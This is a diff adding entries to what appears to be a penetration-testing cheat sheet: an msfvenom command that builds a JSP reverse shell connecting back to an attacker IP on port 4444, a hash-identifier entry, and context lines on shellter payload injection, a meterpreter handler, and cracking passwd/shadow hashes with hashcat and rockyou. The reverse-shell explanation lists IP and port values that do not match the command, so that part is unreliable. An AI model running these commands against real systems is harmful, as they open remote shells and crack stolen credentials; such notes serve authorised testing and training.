@@ -1093,6 +1093,22 @@ Possible finding  C:\Program Files\... --> can be used by putting a file with na
 
 Inject the payload in a trustworthy exe like whoami.exe with the help of shellter
 
+*Generate JSP Payload*
+
+    msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.8 LPORT=4444 -f raw -o revshell.jsp
+
+    -p java/jsp_shell_reverse_tcp
+        Specifies the payload type
+    LHOST=10.10.16.72
+        Specifies my Kali IP address to connect back to
+    LPORT=1337
+        Specifies the port my Kali box is listening on
+    -f raw
+        Outputs the payload in a raw .jsp format
+    -o revshell.jsp
+        Name the output file ‘revshell.jsp’
+
+
 *Msfconsole meterpreter*
 
     msfconsole -q -x "use exploit/multi/handler;\
@@ -1171,6 +1187,10 @@ Try to decrypt passwd and shadow file
 
 remove everything expect the users 
 
+*Hash Identifier Tool*
+
+    hash-identifier
+
 *Hashcat*
 
 Identifiy the Algorithmus used for account creation
@@ -1178,6 +1198,7 @@ https://hashcat.net/wiki/doku.php?id=example_hashes
 
     hashcat64.exe -m Algorithm_Type_number cred.txt rockyou.txt -O
     for example (1800)
+    
 
 *GTFOBins*
 
